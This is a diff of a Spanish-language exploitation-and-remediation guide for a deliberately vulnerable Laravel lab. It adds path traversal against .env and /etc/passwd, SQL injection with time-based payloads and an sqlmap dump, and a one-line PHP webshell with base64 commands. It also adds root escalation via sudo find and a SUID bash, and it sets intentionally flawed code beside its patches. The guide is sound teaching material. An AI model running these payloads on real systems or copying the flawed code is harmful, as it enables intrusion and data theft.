@@ -2,62 +2,14 @@
 
 ## Índice
 
-1. [Arquitectura](#arquitectura)
-2. [Arranque](#arranque)
-3. [Credenciales](#credenciales)
-4. [Vulnerabilidades](#vulnerabilidades)
-5. [Rutas ocultas](#rutas-ocultas)
-6. [Subdominio oculto](#subdominio-oculto)
-7. [Cadena de escalada completa](#cadena-de-escalada)
+1. [Arranque](#arranque)
+2. [Credenciales](#credenciales)
+3. [Vulnerabilidades](#vulnerabilidades)
+4. [Rutas ocultas](#rutas-ocultas)
+5. [Subdominio oculto](#subdominio-oculto)
+6. [Cadena de escalada completa](#cadena-de-escalada)
 
----
-
-## Arquitectura
-
-```
-┌─────────────────────────────────────────────────┐
-│                  Host (alumno)                   │
-│         http://vblog.local  :80                  │
-│         http://dev.vblog.local  :80              │
-└──────────────────┬──────────────────────────────┘
-                   │
-        ┌──────────▼──────────┐
-        │      nginx          │  puerto 80
-        │  reverse proxy      │  virtual hosts
-        │  server.conf        │  → vblog.local → laravel:9000
-        │  dev.conf           │  → dev.vblog.local → dev_panel:80
-        └──────┬──────────────┘
-               │
-       ┌───────┴──────────┐
-       │                  │
-┌──────▼──────┐   ┌───────▼──────┐
-│   laravel   │   │  dev_panel   │
-│  (php-fpm)  │   │ nginx:alpine │
-│  puerto 9000│   │ HTML estático│
-└──────┬──────┘   └──────────────┘
-       │
-┌──────▼──────┐
-│ postgresql  │
-│  puerto 5432│
-│  DB: vblog  │
-└─────────────┘
-```
-
-### Servicios Docker
-
-| Servicio | Imagen | Rol |
-|---|---|---|
-| `nginx` | nginx:alpine (custom) | Reverse proxy, virtual hosts |
-| `laravel` | custom (Dockerfile) | App principal, API REST |
-| `postgresql` | postgres:latest | Base de datos |
-| `dev_panel` | nginx:alpine | Panel interno del subdominio oculto |
-
-### Stack
-
-- **Framework:** Laravel 11
-- **PHP:** 8.2
-- **Base de datos:** PostgreSQL (driver pgsql)
-- **Frontend:** Blade + Tailwind CSS (via Vite)
+> Arquitectura detallada: [docs/arquitecture.md](arquitecture.md)
 
 ---
 
@@ -788,6 +740,342 @@ curl -b admin_cookies.txt http://vblog.local/backup
 
 ---
 
+### 8. Path Traversal — Lectura arbitraria de ficheros (admin)
+
+**Ubicación:** `GET /api/admin/file?path=` en `AdminController::fileRead()`
+
+**OWASP:** A01 — Broken Access Control / A05 — Security Misconfiguration  
+**CWE:** CWE-22 (Path Traversal)
+
+**Por qué existe:** El parámetro `path` se concatena directamente con `base_path()` sin normalización ni lista blanca.
+
+#### Explotación
+
+**Requisito previo:** sesión con `role=admin` (conseguida en vuln #2).
+
+**Paso 1: Leer el `.env` de la app**
+```bash
+curl -b cookies.txt \
+  "http://localhost/api/admin/file?path=.env"
+```
+Output: contenido completo de `.env` con `APP_KEY`, credenciales de BD, etc.
+
+**Paso 2: Salir del directorio de la app**
+```bash
+curl -b cookies.txt \
+  "http://localhost/api/admin/file?path=../../etc/passwd"
+```
+Output: `/etc/passwd` del contenedor → lista de usuarios del sistema.
+
+**Paso 3: Encadenar con phase 7b** — ahora conocemos el filesystem interno y podemos buscar otros ficheros de configuración.
+
+**Impacto:**
+- Lectura de cualquier fichero legible por `www-data`
+- Exposición de claves privadas, `.env`, configuraciones de servicio
+- Permite construir payloads SQLi más precisos o descubrir rutas de upload
+
+#### Verificación de vulnerabilidad
+
+**Archivo:** [app/Http/Controllers/AdminController.php](../app/Http/Controllers/AdminController.php)
+```php
+public function fileRead(Request $request)
+{
+    $path     = $request->query('path', '');
+    $fullPath = base_path($path);           // ← sin validación
+    return response(file_get_contents($fullPath), 200)
+        ->header('Content-Type', 'text/plain');
+}
+```
+
+#### Parche Completo
+
+```php
+// ✅ DESPUÉS (con lista blanca de directorio y extensión)
+public function fileRead(Request $request)
+{
+    $path     = $request->query('path', '');
+    $fullPath = realpath(base_path($path));
+    $allowed  = realpath(base_path('storage/app'));
+
+    if (!$fullPath || !str_starts_with($fullPath, $allowed)) {
+        abort(403, 'Ruta no permitida');
+    }
+
+    return response(file_get_contents($fullPath), 200)
+        ->header('Content-Type', 'text/plain');
+}
+```
+
+#### Validación del parche
+
+```bash
+# Debe fallar
+curl -b cookies.txt "http://localhost/api/admin/file?path=../../etc/passwd"
+# Error esperado: 403 Forbidden
+
+# Debe funcionar solo dentro de storage/app
+curl -b cookies.txt "http://localhost/api/admin/file?path=storage/app/info.txt"
+```
+
+---
+
+### 9. SQL Injection — Estadísticas con filtro inyectable (admin)
+
+**Ubicación:** `GET /api/admin/stats?filter=` en `AdminController::stats()`
+
+**OWASP:** A03 — Injection  
+**CWE:** CWE-89 (SQL Injection)
+
+**Por qué existe:** El valor `filter` se interpola directamente en una query SQL raw sin `DB::raw()` bindings ni preparación.
+
+#### Explotación
+
+**Paso 1: Confirmar inyección con error**
+```bash
+curl -b cookies.txt \
+  "http://localhost/api/admin/stats?filter='"
+# Output: error 500 con traza SQL de PostgreSQL
+```
+
+**Paso 2: Time-based blind (confirmar ejecución)**
+```bash
+curl -b cookies.txt \
+  "http://localhost/api/admin/stats?filter=%' AND (SELECT 1 FROM pg_sleep(3))=1 AND '%'='"
+# Respuesta tarda ≥3 s → confirmado
+```
+
+**Paso 3: Extracción de datos con sqlmap**
+```bash
+sqlmap -u "http://localhost/api/admin/stats?filter=test" \
+  --cookie="$(grep -v '^#' /tmp/cookies.txt | awk '/laravel_session/{print $6"="$7}')" \
+  --dbms=postgresql --level=3 --risk=2 --batch \
+  --dump -T users
+```
+
+**Impacto:**
+- Dump completo de la base de datos
+- Lectura/escritura de ficheros (`COPY TO/FROM`) si el usuario de BD tiene permisos
+- Posible ejecución de comandos OS en configuraciones antiguas de PostgreSQL
+
+#### Verificación de vulnerabilidad
+
+**Archivo:** [app/Http/Controllers/AdminController.php](../app/Http/Controllers/AdminController.php)
+```php
+public function stats(Request $request)
+{
+    $filter = $request->query('filter', '');
+    $rows   = DB::select(
+        "SELECT posts.id, posts.title, posts.tags
+         FROM posts
+         WHERE posts.tags LIKE '%{$filter}%'"  // ← interpolación directa
+    );
+    return response()->json(['status' => 200, 'data' => $rows]);
+}
+```
+
+#### Parche Completo
+
+```php
+// ✅ DESPUÉS (binding con placeholder)
+public function stats(Request $request)
+{
+    $filter = $request->query('filter', '');
+    $rows   = DB::select(
+        "SELECT posts.id, posts.title, posts.tags
+         FROM posts
+         WHERE posts.tags LIKE ?",
+        ["%{$filter}%"]   // ← binding seguro
+    );
+    return response()->json(['status' => 200, 'data' => $rows]);
+}
+```
+
+#### Validación del parche
+
+```bash
+# Payload de inyección debe devolver resultado vacío o normal, no un error
+curl -b cookies.txt \
+  "http://localhost/api/admin/stats?filter=%27%20OR%201=1--"
+# Esperado: [] o resultados normales, NO traza SQL
+```
+
+---
+
+### 10. Insecure File Upload — Webshell mediante subida sin restricción (admin)
+
+**Ubicación:** `POST /api/admin/upload` en `AdminController::upload()`
+
+**OWASP:** A04 — Insecure Design / A05 — Security Misconfiguration  
+**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
+
+**Por qué existe:** El servidor guarda el fichero con el nombre original sin verificar la extensión y lo coloca en `public/avatars/`, directorio servido directamente por nginx.
+
+#### Explotación
+
+**Paso 1: Crear la webshell**
+```bash
+echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > /tmp/shell.php
+```
+
+**Paso 2: Subir al servidor**
+```bash
+curl -b cookies.txt -X POST http://localhost/api/admin/upload \
+  -F "file=@/tmp/shell.php;type=image/jpeg"
+# Output: {"url":"http://localhost/avatars/shell.php"}
+```
+
+**Paso 3: Ejecutar comandos remotamente (RCE)**
+```bash
+# Identidad del proceso web
+curl "http://localhost/avatars/shell.php?cmd=aWQ="         # id
+# Output: uid=33(www-data) gid=33(www-data)
+
+# Listar ficheros sensibles
+curl "http://localhost/avatars/shell.php?cmd=bHMgLWxhIC9ldGMv"  # ls -la /etc/
+```
+
+**Impacto:**
+- Remote Code Execution como usuario `www-data`
+- Pivot hacia la BD, red interna o escalada local
+- Persistencia en el contenedor
+
+#### Verificación de vulnerabilidad
+
+**Archivo:** [app/Http/Controllers/AdminController.php](../app/Http/Controllers/AdminController.php)
+```php
+public function upload(Request $request)
+{
+    $file     = $request->file('file');
+    $filename = $file->getClientOriginalName();  // ← nombre del atacante
+    $file->move(public_path('avatars'), $filename);
+    return response()->json(['url' => url("avatars/{$filename}")], 201);
+}
+```
+
+#### Parche Completo
+
+```php
+// ✅ DESPUÉS (whitelist + nombre aleatorio)
+public function upload(Request $request)
+{
+    $request->validate([
+        'file' => 'required|file|mimes:jpeg,png,gif,webp|max:2048',
+    ]);
+
+    $file     = $request->file('file');
+    $filename = Str::uuid() . '.' . $file->extension();   // nombre no predecible
+    $file->move(public_path('avatars'), $filename);
+
+    return response()->json(['url' => url("avatars/{$filename}")], 201);
+}
+```
+
+**Medida adicional:** configurar nginx para que `public/avatars/` no ejecute PHP:
+```nginx
+location ~* ^/avatars/.*\.php$ {
+    deny all;
+}
+```
+
+#### Validación del parche
+
+```bash
+# Subir shell.php debe ser rechazado
+curl -b cookies.txt -X POST http://localhost/api/admin/upload \
+  -F "file=@/tmp/shell.php"
+# Esperado: 422 Unprocessable Entity
+
+# Subir imagen válida debe funcionar
+curl -b cookies.txt -X POST http://localhost/api/admin/upload \
+  -F "file=@foto.jpg;type=image/jpeg"
+# Esperado: 201 con URL
+```
+
+---
+
+### 11. Privilege Escalation — De www-data a root
+
+**Ubicación:** Dockerfile — sudoers + SUID bash
+
+**OWASP:** A06 — Vulnerable and Outdated Components / A05 — Security Misconfiguration  
+**CWE:** CWE-269 (Improper Privilege Management)
+
+**Por qué existe:** El Dockerfile añade dos misconfiguraciones intencionadas:
+1. `www-data` puede ejecutar `/usr/bin/find` como root sin contraseña
+2. `/tmp/rootbash` es una copia de `/bin/bash` con el bit SUID activo
+
+#### Explotación
+
+**Requisito previo:** RCE obtenida en vuln #10 (webshell activa).
+
+**Paso 1: Comprobar sudo**
+```bash
+curl "http://localhost/avatars/shell.php?cmd=c3VkbyAtbA=="
+# base64: sudo -l
+# Output: (root) NOPASSWD: /usr/bin/find
+```
+
+**Paso 2: GTFOBins — find como sudo para ejecutar comando como root**
+```bash
+# Payload: sudo find . -exec /bin/sh -c 'id > /tmp/pwned' \; -quit
+CMD=$(echo 'sudo find . -exec /bin/sh -c '"'"'id > /tmp/pwned'"'"' \; -quit' | base64 -w0)
+curl "http://localhost/avatars/shell.php?cmd=$CMD"
+
+# Verificar
+curl "http://localhost/avatars/shell.php?cmd=$(echo 'cat /tmp/pwned' | base64 -w0)"
+# Output: uid=0(root) gid=0(root) ← ROOT
+```
+
+**Paso 3 (alternativa): SUID bash**
+```bash
+# Payload: /tmp/rootbash -p -c 'id'
+CMD=$(echo '/tmp/rootbash -p -c id' | base64 -w0)
+curl "http://localhost/avatars/shell.php?cmd=$CMD"
+# Output: uid=33(www-data) euid=0(root) ← SUID efectivo
+```
+
+**Impacto:**
+- Control total del contenedor como root
+- Lectura de secretos del sistema (`/etc/shadow`, claves SSH)
+- Posible escape del contenedor si el socket de Docker está montado
+
+#### Verificación de vulnerabilidad
+
+**Archivo:** [Dockerfile](../Dockerfile)
+```dockerfile
+RUN echo "www-data ALL=(root) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/www-data \
+    && chmod 0440 /etc/sudoers.d/www-data \
+    && cp /bin/bash /tmp/rootbash \
+    && chmod u+s /tmp/rootbash
+```
+
+#### Parche Completo
+
+```dockerfile
+# ❌ ANTES (con misconfiguraciones)
+RUN echo "www-data ALL=(root) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/www-data ...
+RUN cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
+
+# ✅ DESPUÉS (eliminar ambas líneas — sin sudoers, sin SUID)
+# (simplemente borrar los RUN anteriores del Dockerfile)
+```
+
+**Principio de mínimo privilegio:** el proceso web nunca debe ejecutar comandos como root. Usar usuarios sin privilegios y sin acceso a sudo.
+
+#### Validación del parche
+
+```bash
+# Desde webshell: sudo debe fallar
+sudo -l
+# Error esperado: sudo: command not found (o permission denied)
+
+# SUID bash no debe existir
+ls -la /tmp/rootbash
+# Error esperado: No such file or directory
+```
+
+---
+
 ## Rutas ocultas
 
 Ninguna aparece en menús ni enlaces. Descubribles con `gobuster`, `ffuf` o `dirsearch`.
@@ -854,48 +1142,81 @@ gobuster vhost -u http://vblog.local \
 ```
 Fase 0 — Reconocimiento (anónimo)
 │
-│  1. gobuster vhost → encuentra dev.vblog.local
-│  2. curl /api/users/1..52 → IDOR, obtiene datos de todos
-│  3. curl -I / → sin X-Frame-Options, sin CSP, sin headers
-│  4. curl /backup → credenciales de editor01
+│  1. gobuster dir → /backup, /debug, /old, /internal
+│  2. gobuster vhost → dev.vblog.local
+│  3. curl /backup → credenciales editor01 + admin + BD
+│  4. curl /debug → versión PHP, driver, conteos
+│  5. ffuf /api/users/FUZZ → enumeración de IDs de usuarios (IDOR)
+│  6. curl -I / → sin X-Frame-Options, sin CSP, sin headers
 │
 ▼
 Fase 1 — Usuario registrado
 │
-│  1. POST /signup → crear cuenta, O
-│  2. POST /api/login con editor01/editor01pass (de /backup)
-│  3. GET /api/me → confirmar role: "editor"
+│  1. POST /api/login con editor01/editor01pass (de /backup)
+│  2. GET /api/me → role: "editor"
 │
 ▼
-Fase 2 — Escalada a Admin
+Fase 2 — Escalada a Admin (Mass Assignment)
 │
-│  1. PUT /api/update/user/{id} -d '{"role":"admin"}'
+│  1. PUT /api/update/user/{mi_id} -d '{"role":"admin"}'
 │  2. GET /api/me → role: "admin"  ✓ Escalada exitosa
 │  3. GET /dashboard → acceso permitido (broken access control)
 │
 ▼
-Fase 3 — Acceso interno
+Fase 3 — Explotación XSS + acceso interno
 │
-│  1. POST /comments en post con payload XSS
-│  2. XSS ejecuta cuando admin visita el post
-│  3. Cookie de sesión del admin se roba (si HttpOnly no está activo)
-│  4. Navegar a /etc/hosts, agregar dev.vblog.local
-│  5. GET http://dev.vblog.local/logs.html → credenciales de BD
-│  6. psql -h localhost -p 5432 -U vblog_adm -d vblog
-│  7. Acceso directo a base de datos completamente comprometida
+│  1. POST /api/create/comment con payload <script>…</script>
+│  2. XSS se ejecuta cuando cualquier usuario visita el post
+│  3. Cookie robable (HttpOnly=false) → impersonación de sesiones
+│  4. /etc/hosts: 127.0.0.1 dev.vblog.local
+│  5. GET http://dev.vblog.local/logs.html → cadena de BD completa
+│  6. psql -h localhost -p 5432 -U vblog_adm -d vblog → BD comprometida
+│
+▼
+Fase 4 — Panel Admin: Path Traversal + SQLi
+│
+│  1. GET /api/admin/file?path=.env → APP_KEY + credenciales en texto plano
+│  2. GET /api/admin/file?path=../../etc/passwd → usuarios del sistema
+│  3. GET /api/admin/stats?filter=' → error SQL, PostgreSQL confirmado
+│  4. sqlmap → dump completo de tabla users con hashes de contraseñas
+│
+▼
+Fase 5 — RCE mediante File Upload
+│
+│  1. echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > shell.php
+│  2. POST /api/admin/upload -F file=@shell.php → URL: /avatars/shell.php
+│  3. GET /avatars/shell.php?cmd=<base64(id)> → uid=33(www-data)
+│
+▼
+Fase 6 — Escalada a root
+│
+│  1. sudo -l → (root) NOPASSWD: /usr/bin/find
+│  2. sudo find . -exec /bin/sh -c 'id > /tmp/pwned' \; -quit
+│     → uid=0(root)  ✓ ROOT OBTENIDO
+│  O:
+│  3. /tmp/rootbash -p -c id → euid=0(root)  ✓ SUID bash
+│
+└── COMPROMETIDO COMPLETAMENTE
+    - App web (RCE via webshell)
+    - Base de datos (sqlmap dump)
+    - Sistema operativo del contenedor (root)
+    - Posible pivoting a red interna Docker
 ```
 
 ---
 
 ## Resumen de Parches
 
-| Vuln | Archivo | Acción |
-|---|---|---|
-| IDOR | routes/api.php | Agregar middleware('auth') |
-| Mass Assignment | app/Http/Controllers/UserController.php | Validar input, only() |
-| Broken Access Control | routes/web.php | Verificar role admin |
-| Cookies Inseguras | config/session.php | HttpOnly=true, SameSite=lax |
-| Headers Faltantes | nginx/server.conf | Descomentar headers |
-| XSS Stored | layouts/comment.blade.php | Cambiar {!! !!} a {{ }} |
-| XSS Stored | CommentController.php | strip_tags() antes de guardar |
-| Exposición Info | routes/web.php | Proteger /backup, /debug con auth+admin |
+| # | Vuln | OWASP | Archivo | Acción |
+|---|---|---|---|---|
+| 1 | IDOR | A01 | routes/api.php | Agregar `middleware('auth')` |
+| 2 | Mass Assignment | A04 | UserController.php | Validar input, excluir `role` de fillable o usar `only()` |
+| 3 | Broken Access Control | A01 | routes/web.php | Verificar `role === 'admin'` en /dashboard |
+| 4 | Cookies Inseguras | A05 | config/session.php | `HttpOnly=true`, `SameSite=lax` |
+| 5 | Headers Faltantes | A05 | nginx/server.conf | Descomentar headers de seguridad |
+| 6 | XSS Stored | A03 | comment.blade.php | Cambiar `{!! !!}` a `{{ }}`; `strip_tags()` en controller |
+| 7 | Exposición Info | A05 | routes/web.php | Proteger `/backup`, `/debug` con `auth` + check admin |
+| 8 | Path Traversal | A01/A05 | AdminController.php | `realpath()` + whitelist de directorio |
+| 9 | SQL Injection | A03 | AdminController.php | Bindings con `?` en `DB::select()` |
+| 10 | File Upload | A04/A05 | AdminController.php | Validar `mimes:`, nombre aleatorio; nginx bloquea `.php` en avatars |
+| 11 | Privesc root | A06 | Dockerfile | Eliminar entrada sudoers y SUID bash |
